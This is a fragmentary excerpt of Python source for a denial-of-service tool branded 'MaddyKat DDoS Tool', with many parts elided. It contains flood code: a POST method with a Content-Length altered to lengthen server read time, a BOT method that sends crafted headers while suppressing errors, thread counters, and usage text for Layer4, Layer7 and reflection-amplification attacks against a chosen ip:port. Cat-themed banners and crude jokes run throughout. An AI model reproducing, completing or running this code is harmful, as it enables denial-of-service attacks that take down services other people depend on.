...
################ - Counter NB. This version got a threads counter ########
class Counter:
...
class Tools:
    ...
    def sizeOfRequest(res: Response) -> int:
        ...
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items())) ## awww lovely
        return size
    @staticmethod
...
## payload needs some changes.
    ...
    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 47\r\n" ## modified to increase the reading time
...
#"Cookie: _ga=GA%s;"
    ...
    def BOT(self) -> None:
        ...
        p1, p2 = str.encode(
            ...
            "If-Modified-Since: Sun, 26 Oct 2121 04:32:11 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
...
class ToolsConsole:
    ...
    def runConsole():
        ...
        while 1:
            ...
            if cmd == "HELP":
                ...
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"HELP     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Help                                   "+Fore.LIGHTCYAN_EX+"║\n")
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"CLEAR    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Clear                                  "+Fore.LIGHTCYAN_EX+"║\n")
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"BACK     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Back                                   "+Fore.LIGHTCYAN_EX+"║\n")
                ...
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"A Mad    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" I Dont Give a Fuck if you use me.      "+Fore.LIGHTCYAN_EX+"║\n")
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Kitty    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" I want love and food, that's it        "+Fore.LIGHTCYAN_EX+"║\n")
                stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
                stdout.write("\n"+Fore.LIGHTWHITE_EX+"")
    ...
    def usage():
        ...
        stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ "+Fore.LIGHTWHITE_EX+"My name is Kitty and i'm a very mad Cat.       "+Fore.LIGHTCYAN_EX+"        ║\n")
        stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ "+Fore.LIGHTWHITE_EX+"Read the help below and enjoy.                 "+Fore.LIGHTCYAN_EX+"        ║\n")
        stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ "+Fore.LIGHTWHITE_EX+"            Electr0Lulz                        "+Fore.LIGHTCYAN_EX+"        ║\n")
        stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ "+Fore.LIGHTWHITE_EX+"https://github.io/electr0lulz/                 "+Fore.LIGHTCYAN_EX+"        ║\n")
        stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚════════════════════════════════════════════════════════╝\n")
        stdout.write("\n"+Fore.LIGHTWHITE_EX+"")
        print((
                  'Welcome to MaddyKat DDoS Tool! \n'
                  '%d methods has been loaded. \n'
                  '                 Layer4:                 \n'
                  ' %s - (%d)\n'
                  '                 Layer7:                 \n'
                  '%s - (%d)\n'
                  ...
                  'L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file>\n') %
...
if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if one == "HELP" or one == "?":
                raise IndexError()
            if one == "TOOLS" or one == "CONSOLE":
                ToolsConsole.runConsole()
            if one == "STOP" or one == "BYE" or one == "quit":
                ToolsConsole.stop()
            method = one
            host = None
            port = None
            ...
            if method not in Methods.ALL_METHODS:
                exit("404.. Sup? What are you looking for? %s" %
            ...
            logger.info(
                f"{bcolors.WARNING}Meow!! My Claws are coming!{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
